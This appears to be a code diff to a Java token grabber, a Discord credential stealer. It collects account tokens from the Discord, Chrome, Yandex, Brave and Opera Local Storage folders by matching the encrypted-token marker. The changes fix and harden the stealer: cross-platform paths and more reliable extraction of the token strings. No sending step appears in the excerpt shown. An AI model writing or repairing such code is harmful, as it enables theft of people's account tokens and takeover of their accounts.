@@ -163,15 +163,16 @@ public final class Main {
     public static ArrayList<String> getTokens() {
         ArrayList<String> temp = new ArrayList<>();
         ArrayList<File> paths = new ArrayList<>();
-        // Updated path format using Windows environment variable
+        // Updated path format using cross-platform file separator
         String userHome = System.getProperty("user.home");
-        paths.add(new File(userHome + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"));
-        paths.add(new File(userHome + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"));
+        String sep = File.separator;
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Discord" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordptb" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordcanary" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Yandex" + sep + "YandexBrowser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "BraveSoftware" + sep + "Brave-Browser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
         // Correct Discord token identifier pattern from reference implementation
         String tokenPattern = "dQw4w9WgXcQ:";
@@ -187,12 +188,14 @@ public final class Main {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                         // Use the correct Discord token identifier pattern
-                        if (strLine.contains(tokenPattern)) {
+                        int index = strLine.indexOf(tokenPattern);
+                        if (index != -1) {
                             try {
-                                // Extract token after the pattern
-                                String[] parts = strLine.split(tokenPattern);
-                                if (parts.length > 1) {
-                                    String tokenPart = parts[1].split("\"")[0];
+                                // Extract token after the pattern using indexOf instead of split to avoid regex issues
+                                String afterPattern = strLine.substring(index + tokenPattern.length());
+                                int quoteIndex = afterPattern.indexOf("\"");
+                                if (quoteIndex > 0) {
+                                    String tokenPart = afterPattern.substring(0, quoteIndex);
                                     if (!temp.contains(tokenPart) && !tokenPart.isEmpty()) {
                                         temp.add(tokenPart);
                                     }
